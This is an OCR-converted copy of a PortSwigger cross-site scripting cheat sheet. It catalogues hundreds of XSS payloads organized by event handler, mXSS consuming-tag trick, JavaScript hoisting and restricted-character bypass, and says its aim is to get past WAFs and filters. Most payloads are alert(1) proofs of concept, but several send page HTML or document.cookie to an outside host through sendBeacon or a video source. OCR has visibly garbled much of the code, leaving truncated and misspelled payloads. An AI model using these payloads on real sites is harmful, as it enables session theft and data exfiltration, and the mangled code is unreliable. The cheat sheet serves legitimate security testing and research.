# Cross-Site Scripting (XSS) Cheat Sheet - 2026 Edition

> Converted source material; attribution: PortSwigger Web Security Academy. Snapshot processed 2026-10-27.
> Source SHA-256: `7d4070f819756aa7a3fbde2cb07947b678d5ea19a270ebcb04271822156201a4`.
> Conversion: Local English OCR, all 120 text segments. Source opinions and historical examples are preserved, not automatically endorsed.
> OCR literals, payloads, and complex table alignment are not character-verified throughout. Use the curated guidance and exact-text sources for implementation; do not execute OCR examples without checking the publisher.


Web Security Academy Cross-site scripting Cheat sheet

## Cross-site scripting (XSS) cheat sheet

This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or and a proof of concept is included for every vector. You can download a PDF version of the XSS cheat sheet. This is a PortSwigger Research project. Follow us on Twitter to receive updates. This cheat sheet is regularly updated in 2026. Last updated: Wed, 21 Oct 2026 09:06:01 +0000.

Table of contents

Event handlers

Copy tags to clipboard Copy events to clipboard Copy payloads to clipboard

All tags All browsers ondrag custom tags ondragend Chrome Firefox ondragenter abbr Safari ondragexit acronym ondragleave address ondragover applet ondragstart ondrop article ondurationchange aside onend

Search Type: tag v Search term: Search

## Event handlers that do not require user interaction

onanimationcancel Fires when a CSS animation cancels

custom tags v

```text
<style>@keyframes x {from {left: 0; } to {left: 100Cpx; } y: target {animation: 1 Os ease—in out 0s 1 x; }</style><xss id
```

style "position : absolute; " onanimationcanceL ' 'print ( ) ">&lt;/xss&gt; Con Copy Link

onanimationend Fires when a CSS animation ends

custom tags v

```text
<style>@keyframes x {
```

onanimationend="alert (1) ">&lt;/xss&gt; Con Copy Link

onanimationiteration Fires when a CSS animation repeats

---

slidein style—nan Imation—duration: Is; animation—name animation—iteratio count: 2" (1) ">&lt;/xss&gt; Con Copy Link

onanimationstart Fires when a CSS animation starts

custom tags v x { style— " animat ion—name : x" (1) ">&lt;/xss&gt; Con Copy Link

onbeforematch Fires when a hidden element is revealed

input &lt; input type—hidden id=x onbeforematch=alert (1) hidden—until found&gt; Con Copy Link

onbeforeprint Fires before the page is printed

body v

```text
<body onbeforeprint=consoIe.Log (1) >
```

Con Copy Link

onbeforeunload Fires after if the url changes

body v

```text
<body onbeforeunload=navigator . sendBeacon (
```

' // s sl . port-swigger—labs . net/' , document . body . inner-HTML) > Con Copy Link

onbegin Fires when a svg animation begins

animate &lt; svg&gt;&lt;animate onbegin=alert (1) attributeName=x dur=ls&gt; con Copy Link

oncanplay Fires if the resource can be played

audio &lt; audio oncanplay=alert (1) src 'Iva Iidaudio . wav" t ype " audio/ wav" &gt;&lt;/ audio&gt; Con Copy Link

oncanplaythrough

---

video < video oncanplaythrough—alert (1) src "validvideo . mp4 " type ' 'video/mp4 " Con Copy Link

oncontentvisibilityautostatechange Fires on all tags when content-visibility is set to auto

custom tags v

```text
<xss oncontentvisibiLityautostatechange=aIert (1)
```

styLe=di splay : block; content —Vis : auto> Con Copy Link

oncontentvisibilityautostatechange(hidden) Fires in a hidden input when content-visibility is set to auto

input v &lt; input type—hidden oncontentvisibilityautostatechange=alert (1) style—content-visibility: auto&gt; Con Copy Link

oncuechange Fires when subtitle changes

track v &lt; video src—validvldeo .mp4 default oncuechange=alert (1) Lex L/vtt, WEBVIT ELLE 1 00:00. •oc.coc -&gt; ccc &lt;b&gt;XSS&lt;/b&gt; Con Copy Link

ondurationchange Fires when duration changes

audio v

```text
<audio controls ondurationchange=alert (1) ><source src=valldaudio . mp3 type=audio/mpeg></audi0>
```

Con Copy Link

onend Fires when a svg animation ends

animate onend—aLert (1) attributeNarne—x dur Is > Con Copy Link

onended Fires when the resource is finished playing

audio

```text
<audio controls autopLay onended=alert (1) ><source
```

type=" audi0> Con Copy Link

---

Fires when the resource fails to load or causes an error

audio v

&lt; audio src/onerror=alert (1) &gt; Con Copy Link

onfocus Fires when the element has focus

a id=x tabindex=l onfocus=aLert (1) >&lt;/a&gt; Con Copy Link

onfocus(autofocus) Fires when a element has focus and the autofocus attribute is used to focus automatically.

custom tags v

```text
<xss onfocus=alert (1)
```

autofocus tablndex=l> con Copy Link

onfocusin Fires when the element has focus

a < a id=x tabindex=l onfocusin—alert (1) Con Copy Link

onhashchange Fires if the hash changes

body v

```text
<body ( )
```

Con Copy Link

onload Fires when the element is loaded

body

```text
<body onload—alert (1) >
```

Con Copy Link

onloadeddata Fires when the first frame is loaded

audio v

&lt; audio onloadeddata=aLert (1) &gt;&lt;source .wav" type—I' audio&gt;

Copy Link

---

onloadedmetadata Fires when the meta data is loaded

audio

```text
<aud10 autoplay onloadedmetadata—alert (1) > < source src—"validaudio.wav"
```

type—" Con Copy Link

onloadstart Triggered audio or video is loaded

audio v < audio onloads tart=" alert (1) Con Copy Link

onmessage Fires when message event is received from a postMessage call

body

```text
<body onmessage=print ( ) >
```

Con Copy Link

onpagereveal Fires when the page is shown

body v

```text
<body onpagereveal=alert (1) >
```

Con Copy Link

onpageshow Fires when the page is shown

body v

```text
<body onpageshow=alert (1) >
```

Con Copy Link

onplay Fires when the resource is played

audio v

< audio autoplay onplay—alert (1) . wav" type— " audio/ wav' con Copy Link

onplaying Fires the resource is playing

audio

```text
<aud10 autoplay onplaying—alert (1) ><source src—"validaudio.wav"
```

type— " audio /wav" audi0>

---

onpopstate Fires when the history changes

body v

```text
<body onpopstate=print ( ) >
```

Con Copy Link

onprogress Fires when the video/audio begins downloading

audio

```text
<audio controls anprogress—alert (1) ><source src=va1idaudio.mp3
```

Con Copy Link

onrepeat Fires when a svg animation repeats

animate

```text
<svg><animate on repeat—alert (1)
```

attributeName—x dur—ls repeatCount—2 Con Copy Link

onresize Fires when the window is resized

body

```text
<body on resize
```

"print ( ) Con Copy Link

onscroll Fires when the page scrolls

body v

```text
<body onscr011=a1ert (1) ><div id=x></div>
```

con Copy Link

onscrollend Fires when the scrolling to the end of the element

custom tags v &lt; xss onscrollend=alert (1) s overflow: auto; border: 1 px dashed; width: "&gt;&lt;br&gt;<

```text
<br><br><br><span span></xss>
```

Con Copy Link

onscrollsnapchange Fires at the end of a scrolling operation

---

&lt; address onscrollsnapchange=alert (1) hidden; align : address&gt; Con Copy Link

onscrollsnapchanging Fires when the scroll position is snapping to a new point

custom tags v &lt; style&gt; . scroll container { overflow—x: scroll; scroll snap type: x mandatory; display: flex; width: 300px; } . scroll—item { flex: 0 0 500px; start; } . scroll—item: first—child { animation: sample; anima duration: 0.1 s; } @keyframes sample IOC% none; } class—I' scroll—container" (1) "> &lt;xss class—"scr01L—item"&gt;Item l&lt;/xss&gt;&lt;xss 2&lt;/xss&gt;</xs Con Copy Link

onsecuritypolicyviolation Fires when a CSP violation occurs. This would be site specific.

custom tags v

```text
<xss on securitypolicyviolation=alert (1) >XSS</xss>
```

Con Copy Link

onslotchange Fires when the slot's assigned content changes

slot x&lt;template onslotchange—alert (1) &gt; Con Copy Link

onsuspend Fires when the video/audio when the data loading is suspended

audio v < audio controls onsuspend=alert (1) src=validaudio . mp3 Con Copy Link

ontimeupdate Fires when the timeline is changed

audio v

```text
<aud10 controls autopLay ontimeupdate—alert (1) src
```

"validaudio . wav" type " audio/ wav" audio> Con Copy Link

ontoggle

---

details v

```text
<details ontoggle=alert (1)
```

Con Copy Link

ontransitioncancel Fires when a CSS transition cancels

custom tags v < {color: red; id=x 1 Os" ontransitioncancel=print ( ) Con Copy Link

ontransitionend Fires when a CSS transition ends

custom tags v

```text
<xss autofocus on transutionend—alert (1)
```

tab Con Copy Link

ontransitionrun Fires when a CSS transition begins

custom tags v &lt; style&gt;:target {transform: rotate (180deg) ; }&lt;/style&gt;&lt;xss id=x style—I' transition: transform 2 s" ontransitionrun—print ( ) &gt;&lt;/xss&gt; Con Copy Link

ontransitionstart Fires when a CSS transition starts

custom tags v

```text
<style>:target {color: red; }</style><xss id=x Is" ontransitionstart—alert (1)
```

Con Copy Link

onunhandledrejection Fires when a promise isn't handled

body v

```text
<body onunhandledrejection—alert (1) ( // xyz ) < / scr
```

Con Copy Link

onunload Fires when the page is unloaded

body

```text
<body onunload—navigator. sendBeacon (' //ssl . port swigger labs . net/ ' , document . body . innerHTML) >
```

Con Link Copy

---

Fires when a form control's validation state changes

camera

```text
<camera onvalidationstatuschange=alert (1) >
```

Con Copy Link

onwaiting(loop) Fires when the video/audio attempts to replay

audio v

```text
<aud10 controls loop muted autoplay onwaiting—alert (1) src=va1idaudio.mp3 type—audio/
```

Con Copy Link

onwebkitanimationend Fires when a CSS animation ends

custom tags v

```text
<style>@keyframes x { : x"
```

onwebkltanimationend="alert (1) ">&lt;/xss&gt; con Copy Link

onwebkitanimationiteration Fires when a CSS animation repeats

custom tags s 11 dein animation—iteratio count: 2" onwebkitanimationiteration="alert (1) ">&lt;/xss&gt; Con Copy Link

onwebkitanimationstart Fires when a CSS animation starts

custom tags v x { style " animat ion—name : x" onwebkitan mat-ions tart=" alert (1 ) Con Copy Link

onwebkitneedkey Fires when an HTML media element encounters encrypted content and needs a decryption key from the page

audio v

```text
<aud10 src=data: , X-KEY
```

128, 1%OAx onwebkitneedkey—alert (1) con Copy Link

onwebkitplaybacktargetavailabilitychanged Fires when the availability of an AirPIay playback target changes

audio

```text
<aud10 onwebkitplaybacktargetavailabilitychanged—alert (1) >
```

---

onwebkittransitionend Fires when a CSS transition ends

custom tags v

```text
<xss style—transition: Is onwebkittransitionend—alert (1)
```

tab index—I autofocus > Con Copy Link

## Event handlers that do require user interaction

onafterprint Fires after the page is printed

body v

```text
<body onafterprint—alert (1) >
```

Con Link Copy

onauxclick Fires when right clicking or using the middle button of the mouse

input v &lt; input onauxclick alert (1) &gt; Con Link Copy

onbeforecopy Requires you copy a piece of text

content a > Con Copy Link

onbeforecut Requires you cut a piece of text

a

Con Copy Link

onbeforeinput Fires when the value of the element is about to be modified

custom tags v

```text
<xss contenteditable onbeforeinput—alert (1) > test
```

con Copy Link

onbeforepaste Fires at the end of a paste operation

---

```text
<xss onbeforepaste—aLert (1) >XSS</xss>
```

con Copy Link

onbeforetoggle Fires before the a popop element is toggled

custom tags

```text
<button popover target=x>C1ick me</button><xss onbeforetoggle=alert (1)
```

popover id—x>XSS&lt;/xss&gt; Con Copy Link

onblur Fires when an element loses focus

custom tags v

```text
<xss onblur—alert (1)
```

id=x tabindex=l style—display: Con Copy Link

oncancel Fires when an a file upload is cancelled

&lt; input type—file oncancel—alert (1) &gt; Con Link Copy

onchange Requires as change of value

input v < input onchange—alert (1) Con Copy Link

onclick Requires a click of the element

custom tags v

```text
<xss (1) "
```

style=di splay : xss> Con Copy Link

onclose Fires when a dialog is closed

dialog v

```text
<dialog open onclose=alert (1) ><form
```

Con Copy Link

oncommand

---

div v

```text
<button commandfor—test id=test oncommand=alert (1) >
```

Con copy Link

oncontextmenu Triggered when right clicking to show the context menu

custom tags

```text
<xss oncontextmenu
```

" a Lert (1) " style=display : Con Copy Link

oncopy Requires you copy a piece of text

custom tags v

```text
<xss oncapy=alert (1)
```

value— -"XSS" autofocus tabindex=l style—display: block>test Con Copy Link

oncut Requires you cut a piece of text

custom tags v

```text
<xss oncut=alert (1)
```

value— "XSS" autofocus tabindex—l style—display: block>test con Copy Link

ondblclick Triggered when double clicking the element

custom tags < xss ondblclick—"alert (1) " autofocus tabindex—l style—display: Con Copy Link

ondrag Triggered dragging the element

custom tags v

```text
<xss
```

styLe=di spLay : bl xss> Con Copy Link

ondragend Triggered dragging is finished on the element

custom tags v style=dzsplay : /xss>

```text
<xss
```

Con Copy Link

---

Requires a mouse drag

custom tags v

```text
<xss
```

style—display: Con Copy Link

ondragexit Triggered when dragging the element

custom tags v

```text
<xss draggable
```

"true " style=display : Con Copy Link

ondragleave Requires a mouse drag

custom tags v

```text
<xss draggable="true"
```

style=dlsplay:block>test&lt;/xss&gt; con Copy Link

ondragover Triggered dragging over an element

custom tags

```text
<div draggable
```

l' true " contenteditable>drag ondragover=alert (1) contenteditable style=display : block here&lt;/xss&gt; Con Copy Link

ondragstart Requires a mouse drag

custom tags v

```text
<xss draggable
```

' 'true t' ondragstart "alert (1) 't Con Copy Link

ondrop Triggered dropping a draggable element

custom tags v

```text
<div draggable="true"
```

cantenteditable>drag me&lt;/div&gt;&lt;xss ondrop=alert (1) contenteditable style—display: block&gt;dro

con Copy Link

onfocusout Fires when an element loses focus

custom tags &lt; xss onfocusout=alert (1) autofocus tabindex—l style—display: value=clickme&gt;

---

onformdata Triggered when a form is submitted

form v < form (1) Con Copy Link

onfullscreenchange Fires when a video changes full screen status

video &lt; video onfullscreenchange=alert (1) src=valldvideo . mp4 controls&gt; Con Copy Link

ongesturechange Fires when the gesture is in progress and changes occur.

custom tags v

```text
<div ongesturechange—alert (1) >XSS</div>
```

Con Copy Link

ongestureend Fires when the gesture comes to an end.

custom tags v

```text
<div ongestureend—alert (1)
```

Con Copy Link

ongesturestart Fires when multiple fingers touch the surface, initiating a new gesture.

custom tags v

```text
<div ongesturestart=aLert (1) >XSS</d1v>
```

con Copy Link

ongotpointercapture Requires interaction with input range via click

input v

```text
<input type—range ongotpoinLercapLure=a1erL (1) >
```

Con Copy Link

oninput Requires as change of value

input

---

Copy Link

oninvalid Requires a form submission with an element that does not satisfy its constraints such as a required attribute.

input &lt; on invalid=alert (1) required&gt;<lnput Con Copy Link

onkeydown Triggered when a key is pressed

custom tags v

```text
<xss onkeydown
```

"alert (1) " contented Itable style—display: Con Copy Link

onkeypress Triggered when a key is pressed

custom tags v

```text
<xss on keypress="alert (1) " contenteditable style=dlsplay:block>test</xss>
```

con Copy Link

onkeyup Triggered when a key is released

custom tags < xss onkeyup="alert (1) " contenteditable style—display: Con Copy Link

onlocation Fires when the browser requests the user's location after permission is granted

geolocation v

```text
<geolocation auto locate on location—alert (1) >
```

Con Copy Link

onlostpointercapture Requires interaction with input range via click

input &lt; input type—range on lost pointercapture=alert (1) &gt; Con Copy Link

onmousedown Triggered when the mouse is pressed

---

```text
<XSS (1)
```

style—display : b con Copy Link

onmouseenter Triggered when the mouse is hovered over the element

custom tags &lt; xss onmouseenter—" alert (1) " style—display: block&gt;test&lt;/xss&gt; Con Copy Link

onmouseleave Triggered when the mouse is moved away from the element

custom tags v

```text
<xss (1) style—display:
```

Con Copy Link

onmousemove Requires mouse movement

custom tags v

```text
<xss (1) "
```

style—di splay : Con Link Copy

onmouseout Triggered when the mouse is moved away from the element

custom tags

```text
<xss (1) "
```

style—display : Con Copy Link

onmouseover Requires a hover over the element

custom tags v

```text
<xss onmauseover—
```

—"alert (1) " style—display : Con Copy Link

onmouseup Triggered when the mouse button is released

custom tags

```text
<xss (1) "
```

style=di splay xss> Con Copy Link

onmousewheel

---

custom tags v

```text
<xss onmousewheel=alert (1)
```

style—display : block>requires scrolling Con copy Link

onmozfullscreenchange Fires when a video changes full screen status

video &lt; video onmozfullscreenchange=alert (1) src validvideo.mp4 controls &gt; Con Copy Link

onpagehide Fires when the page is changed

body v

```text
<body onpagehide=navigatar . sendBeacon ( ' //ssl . part swigger labs . net/ '
```

document . body . innerHTML) > Con Copy Link

onpageswap Fires when the page reloads

body

```text
<body onpageswap=navigator . sendBeacon ( // s s L . port swigger—labs . net/ , document . body . inner HTML) >
```

con Copy Link

onpaste Requires you paste a piece of text

```text
<a onpaste=" alert (1) " contenteditable>test</a>
```

Con Copy Link

onpause Requires clicking the element to pause

audio v &lt; audio autoplay controls onpause=aLert (1) .wav" type—I' audio audlo&gt; Con Copy Link

onpointercancel You need to make a selection and drag the text using a laptop touchpad.

custom tags v

```text
<xss onpointercancel=alert (1)
```

Con Copy Link

---

Fires when the mouse down custom tags v

```text
<xss onpointerdown=alert (1)
```

style—display :bLock>XSS&lt;/xss&gt; Con Copy Link

onpointerenter Fires when the mouseenter custom tags v

```text
<xss onpointerenter—alert (1)
```

style display: Con Copy Link

onpointerleave Fires when the mouseleave custom tags v

```text
<xss onpointer1eave=aLert (1)
```

style=display : con Copy Link

onpointermove Fires when the mouse move custom tags

```text
<xss onpointermove alert (1)
```

style Con Copy Link

onpointerout Fires when the mouse out custom tags v

```text
<xss onpointerout=alert (1)
```

styLe=d1spLay x s s > Con Copy Link

onpointerover Fires when the mouseover custom tags v

```text
<xss onpointerover—alert (1)
```

style—display : Con Copy Link

onpointerrawupdate Fires when the pointer changes custom tags v &lt; x ss onpainterrawupdate—alert (1) style—di splay : xss&gt; Copy Link

---

onpointerup Fires when the mouse up

custom tags < xss onpointerup—alert (1) style—display: Con Copy Link

onpromptaction Fires when the user takes an action in the prompt (such as confirm)

geolocation v

```text
<geolocation onpromptaction=alert (1) >
```

Con Copy Link

onpromptdismiss Fires when the user opens the prompt and closes it without responding

geolocation v

```text
<geolocation onpromptdismiss=alert (1) >
```

Con Copy Link

onratechange Fires when the speed of the video changes

audio v &lt; audio controls au top Lay onratechange=alert (1) &gt;&lt;source src = 'validaudio . wav" type= audio/ wav" audio&gt; Con Copy Link

onreset Requires a click

form v &lt; form onreset=alert (1) &gt;&lt;input type=reset&gt; Con Copy Link

onsearch Fires when a form is submitted and the input has a type attribute of search

input v &lt; type—search on search—alert (1) return" autofocus &gt; con Copy Link

onseeked Requires clicking the element timeline

audio

```text
<aud10 autoplay controls onseeked—alert (1) ><source
```

type=" audio / wav" audi

---

onseeking Requires clicking the element timeline

audio v

```text
<audio autoplay controls
```

onseeking—alert (1) .wav" type- ' audio/ Con Copy Link

onselect Requires you select text

input

```text
<input onselect=alert (1)
```

value=' 'XSS" autofocus > Con Copy Link

onselectionchange Fires when text selection is changed on the page

body

```text
<body on selectionchange—alert (1) >select some text
```

Con Copy Link

onselectstart Fires when beginning a text selection

body

```text
<body onselectstart—alert (1) >select some text
```

Con Copy Link

onstream Fires when the user grants permission

usermedia v &lt; usermedia onstream=aLert (1) &gt; con Copy Link

onsubmit Requires a form submission

form v &lt; form onsubmiL=a1erL (1) &gt;&lt;input type=submiL&gt; Con Copy Link

ontoggle(popover) Fires when the a popop element is toggled

custom tags v

---

Copy Link

ontouchcancel Fires when the select text, only mobile device

custom tags v &lt; x ss ontouchcancel=alert (1) &gt;XSS&lt;/xss&gt; Con Copy Link

ontouchend Fires when the touch screen, only mobile device

```text
<body on touchend—alert (1) >
```

Con Copy Link

ontouchmove Fires when the touch screen and move, only mobile device

body

```text
<body ontouchmove=alert (1) >
```

con Copy Link

ontouchstart Fires when the touch screen, only mobile device

body

```text
<body ontouchstart—alert (1) >
```

Con Copy Link

onvolumechange Requires volume adjustment

audio v &lt; audio autoplay controls onvolumechange=alert (1) &gt;&lt;source .wav" type—I' audi o/ audio&gt; Con Copy Link

onwaiting Fires when the video/audio attempts to play

audio v

```text
<aud10 controls onwaxting—alert (1) src—x
```

Con Copy Link

onwebkitfullscreenchange Fires when a video changes full screen status

---

&lt; video controls src=validvideo . mp4 onwebkitfullscreenchange=alert (1) &gt; con Copy Link

onwebkitmouseforcechanged Requires a click from a laptop touchpad

custom tags &lt; xss onwebkitmouseforcechanged—alert (1) &gt;XSS&lt;/xss&gt; Con Copy Link

onwebkitmouseforcedown Requires a click from a laptop touchpad

custom tags v

```text
<xss onwebki tmouseforcedown—alert (1) >XSS</xss>
```

Con Copy Link

onwebkitmouseforceup Requires a click from a laptop touchpad.

custom tags v

```text
<xss onwebkitmouseforceup—alert (1)
```

Con Link Copy

onwebkitmouseforcewillbegin Requires a click from a laptop touchpad

custom tags

```text
<xss onwebkitmouseforcewillbegin—alert (1)
```

Con Copy Link

onwebkitpresentationmodechanged Fires when a video changes full screen status

video

```text
<video controls src=validvideo .mp4 onwebkitpresentationmodechanged=alert (1) >
```

Con Copy Link

onwebkitwillrevealbottom Requires a click from a laptop touchpad

custom tags

```text
<xss onwebkitwillrevealbottom=alert (1)
```

Con Copy Link

onwheel

---

body

```text
<body onwheel—alert (1) >
```

Con copy Link

Math

Math textarea and image

src onerror—aLert (1)

Copy Link

Math textarea and embed

```text
<math><textarea><embed src—l onerror=alert (1)
```

type=image/gif>&lt;/textarea&gt;&lt;/math&gt;

Copy Link

Math textarea and body

```text
<math><textarea><body onload—alert (1) ></textarea></math>
```

Copy Link

Math noscript and image

src onerror—alert (1)

Copy Link

Math noscript and embed

src 1 onerror=alert (1) type—image/ gi

Copy Link

Math noscript and body

```text
<math><nascript><body onload—alert (1) ></noscript></math>
```

Copy Link

Math title and image

src onerror=alert (1)

---

Link

Math title and embed

src 1 onerror—aLert (1) type image/

Copy Link

Math title and body

onload—alert (1)

Copy Link

Consuming tags

Noembed consuming tag

&lt; noembed&gt;<img src onerrar—alert (1)

Copy Link

Noscript consuming tag

title="&lt;/noscript&gt;&lt;img src onerror=alert (1) &gt;">&lt;/noscript&gt;

Copy Link

Style consuming tag

```text
<style><img src onerror=alert (1) >"></style>
```

Copy Link

Script consuming tag

< src onerror=a ert (1)

Copy Link

---

title src onerror—alert (1)

Copy Link

xmp consuming tag

t •mg src onerror—alert (1)

Copy Link

textarea consuming tag

&lt; text area&gt;&lt;img title="&lt;/textarea&gt;&lt;lmg src onerror=alert (1) &gt;">&lt;/textarea&gt;

Copy Link

noframes consuming tag

```text
<noframes><img title="</noframes><lmg src onerror—alert (1)
```

Copy Link

Title consuming tag

< title src onerror—alert (1)

Copy Link

Byass noscript consume using select

< src onerror=alert (1)

Copy Link

Byass title consume using select

&lt; select&gt;&lt;title&gt;&lt;/select&gt;<img src onerror=alert (1)

Copy Link

Byass style consume using select

&lt; select&gt;&lt;style&gt;&lt;/select&gt;&lt;img src onerrar—alert (1) &gt;&lt;/style&gt;&lt;/select&gt;

Copy

---

Byass noembed consume using select

&lt; select&gt;&lt;noembed&gt;&lt;/select&gt;&lt;img src onerror—alert (1) &gt;&lt;/noembed&gt;&lt;/select&gt;

Copy Link

Byass xmp consume using select

&lt; select&gt;&lt;xmp&gt;&lt;/select&gt;<img src anerror—alert (1)

Copy Link

Byass noframes consume using select

< src onerror=alert (1)

Copy Link

JS hoisting

XSS Hoisting via undefined variable

&lt; script&gt;eval (myUndefVar) ; var inject— "INJECTION STARTS HERE ' •var myUndefVar;a1ert (1) ,

- // " ; &lt; / script &gt;

Copy Link

XSS Hoisting via undefined function

&lt; script&gt;rnyUndefFunction (13, 37) ; var inject -"INJECTION STARTS HERE" ;

```text
function myUndefFunction ( ) { } ; alert (1) ,
```

&lt; / script &gt;

Copy Link

XSS Hoisting via undefined class

myUndefObj ect — new myUndefCIass ( ) ; var inject ' INJECTION STARTS HERE ' • function myUndefCIass ( ) {l; alert (1) ; // " ; &lt; / script &gt;

Copy Link

XSS Hoisting via undefined JQuery $(document).ready()

&lt; script&gt;$ (document) . ready (function ( ) {var inject INJECTION STARTS HERE' ';}) ; function $ ( ) {return {ready: ( ) (1); (function ( ) {

Copy Link

---

XSS Hoisting via parameter of an undefined accessor (object syntax)

&lt; script&gt;undef01 . undef02 ("INJECTION"+a1erL (1) ) ; function undef01 ( ) { } // ; &lt; / script&gt;

Copy Link

XSS Hoisting via parameter of an undefined accessor (array syntax)

[ 'undef02 , INJECTION' *alert (1) ; function undefC1 ( ) ( ) ,

Copy Link

XSS Hoisting via undefined accessor (module type + import)

< script . undef02 . undef03.undefC4 . undef05 ( ) ; var inject = 'INJECTION" ; import "data : text/ j script, alert (1) " / / " ;

Copy Link

XSS Hoisting via native function hijacking

&lt; script&gt;var x—atob ("dXN1bGVzcyBj YWxs1G9mIG5hdG12ZSBmdW5jdG1vbiAh") ; undef01 . undef02 ( ) ; var iniect •W/" ; &lt; / script &gt; "INJECTION" ; function a tob ( ) {alert (1) ,

Copy Link

File upload attacks

Add blob to file object

< input type " file" id " filelnput t' file Input = document . get Element By file Input') ,

- const

dataTransfer = new Data Transfer() ; const file = new File ( ['Hello world! 'hello .txt', { type : 'text/ plain' } ) ; dataTransfer . Items . add (file) ; filelnput. files — dataTransfer. files&lt;/ script&gt;

Copy Link

Restricted characters

No parentheses using exception handling

< throw

Copy Link

No parentheses using exception handling no semi colons

---

Copy Link

No parentheses using exception handling no semi colons using expressions &lt; script&gt;throw onerror=alert,

Copy Link

No parentheses using exception handling and string eval on Chrome I Edge

&lt; script&gt;throw onerror=eval, Copy Link

No parentheses using exception handling and string eval on Safari &lt; script&gt;throw onerror=eval, 'alert\x281\x29'&lt;/script&gt;

Copy Link

No parentheses using exception handling and object eval on Firefox &lt; script &gt; { throw ( LineNumber : 1 , coLumnNumber : 1 , fileName : 1 , message : alert \ x 281 \x29 ' } &lt; / script &gt;

Copy Link

No parentheses using exception handling and object eval on Firefox I Safari &lt; script&gt;throw onerror=eval, e=new Error, e. message=' alert\x281 \x29' ,

Copy Link

No parentheses using exception handling and location hash eval on all browsers

```text
<scrlpt>throw e—new Error, e. message=' / * '+1 ocation . hash, ! ! window. InstallTrigger?
```

Copy Link

---

&lt; , location. hash, e {lineNumber : 1, columnNumber : 1, fileName : 0, message : h C 2) +h [1] +h} , ! ! window . Install Trigger?e : e . message&lt;/ script &gt;

Copy Link

No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers &lt; script&gt;throw/x/ , onerror=Uncaught eval,h location. hash, e Error, e. LineNumber=e. columnNumber=e . fileName e. message +h [T] +h, ! ! window. Tnsta11Trigger?e:e.message&lt;/script&gt;

Copy Link

No parentheses using ES6 haslnstance and instanceof with eval &lt; script &gt; alert \ x 281 \x29 instanceof{ C Symbol . has Instance] : eval } &lt; / script &gt;

Copy Link

No parentheses using ES6 haslnstance and instanceof with eval without . &lt; script &gt; instanceof{ (Symbol 'has Instance : eval } &lt; / script &gt;

Copy Link

No parentheses using location redirect &lt; script &gt; location= java script : alert \ x 281 \ x 29 &lt; / script &gt;

Copy Link

No parentheses using location redirect no strings . name— ' alert (1) ' ;

Copy Link

No parentheses using template strings s 1 k/ scrapt>

Copy Link

No parentheses using template strings and location hash &lt; script&gt;new Function 'X $ {document . location . hash. subs t r Z & } k/ script >

---

Link

No parentheses or spaces, using template strings and location hash &lt; script&gt;Function X$ {document . location . hash . substr 1 &lt; / script &gt; Copy Link

XSS cookie exfiltration without parentheses, backticks or quotes &lt; video&gt;&lt;source . rs/+document. cookie&gt;

Copy Link

XSS without greater than

< svg onload—alert (1) Copy Link

XSS without greater using a HTML comment < svg onload—alert Copy Link

Array based destructuring using onerror &lt; script&gt;throw (alert) , 1 &lt; / script &gt;

Copy Link

Destructuring using onerror ; throw Copy Link

Destructuring using default values and onerror &lt; throw 1&lt;/scripL&gt;

Copy Link

---

&lt; script&gt;window . name= java script : alert (1)

Copy Link

Avoiding Invalid left-hand side in assignment without • , (), ? , O, or , using object literal

< javascrzpt:alert (1) ' ; function blah ( ) { } blah (""+{a: ' '

Copy Link

Avoiding Invalid left-hand side in assignment without • , (), ? , E], or , using new class

(1) ; function blah ( ) { } blah (""+new class &lt; / script &gt;

Copy Link

Script tag using only uppercase

```text
<SCRIPT SRC HTTPS: // PORTSWIGGER LABS
```

Copy Link

Script tag using only uppercase using JSFuck and inline

[ ! [ ( ! c 1+[]) c 1+1] ) [ 1+ n

! c 1+[]) [+1]] n c ! ! [ 1+11) c [

Copy Link

window.name with onerror and throw

&lt; script&gt;throw onerror=eval,name&lt;/script&gt;

---

Link

location with onerror and throw

&lt; script&gt;throw onerror—eval,

Copy Link

SVG with onerror, throw and document.URL

&lt; svg onload—I' throw top . onerror=eval, URL " &gt;

Copy Link

body with onerror, throw and location

```text
<body onerror=eval,
```

Copy Link

ondevicemotion and URIError object

&lt; script&gt;andevi cemoti on—set Timeout; Event . prototype . toString=URIError . prototype . toString ; Event . prototype . message— t\x281

Copy Link

ondeviceorientation and Error object

&lt; imeout ; Event . prototype . toString—Error . prototype . tostring ; Event . prototype . name— ' \x281 \x29 ' &lt; / script &gt;

Copy Link

ondeviceorientationabsolute and WebTransportError object

&lt; Event . prototype . toString=WebTransportError . prototype . toString ; Ev rototype . name— ' alert \x281 \ x 29 ' &lt; / scrupt&gt;

Copy Link

onpagereveal and AggregateError object

< ; Event . prototype . toString=AggregateError . prototype . toString ; Event . prototype . name rt\x281

copy

---

onpageswap and EvalError object

&lt; Location= x ; Event . prototype . toSLr1ng=EvaLError . prototype . toSCring ; Event . prototyp e — ' alert\x281 \ x 29 &lt; / script &gt;

Copy Link

onmessage and RangeError object

< i frame .php?x— set Timeout; Event. prototype. toString RangeError . prototype. toString;Event.prototype .na: ; target . anload=setTumeout (function ( ) (frames .postMessage (

Copy Link

onhashchange and Regex object

imeout; location . hash—location; Event . prototype . flags—' . call \x28a1ert ; Even tot ype . toString=/x/ . toString&lt;/ script &gt;

Copy Link

onscroll and ReferenceError object

&lt; . body . style . height=' 9999px' ; document . document Element . scroll Top 1; Event . prot . toString—ReferenceErrar . prototype . toString; Event . prototype . name— ' alert\x281 \x29 ' &lt; / script &gt;

Copy Link

onscrollend and SyntaxError object

< ; document . body . style . height= 999 9px ; document . documentEIement . scroll Top—I ; Event . p ype . toString SyntaxError.prototype . toString;Event . prototype . name— alert \ x 281

Copy Link

onselect and TypeError object

&lt; input value=x autofocus onfocus="window . onse1ect—setTimeout; this . selectionStart—1 ; Event . prototype . toString=TypeError . prototype . toString t. prototype . message— ' alert \ x 281 \ x 29' "&gt;

Copy Link

ontransitionstart I ontransitionend I ontransitionrun and Arrow function

```text
<img/ : O . Ls
```

. ontransitionstart—setTimeout; this . style . opacity—C ; Event . prototype . ' alert \ x 281 \ x

---

Link

onload and DOMException object

. onload setTimeout;Event . prototype . toString=DCMException . prototype . toString; Event . proto name— ' alert \ x 281 \x29' ">

Copy Link

onpageshow and WebTransportError object

&lt; img/ imeout ; Event . prototype . toString=WebTransportError . prototype . toString ; Event . prot . name=' alert\x281 \ x 29 ' &gt;

copy Link

onerror and ReferenceError without throw

< img/ src/onerror=window . onerror=evaL; ReferenceError . prototype . name—

Copy Link

SVG onerror and XSS new constructor

< svg new

Copy Link

onerror and new operator on window name

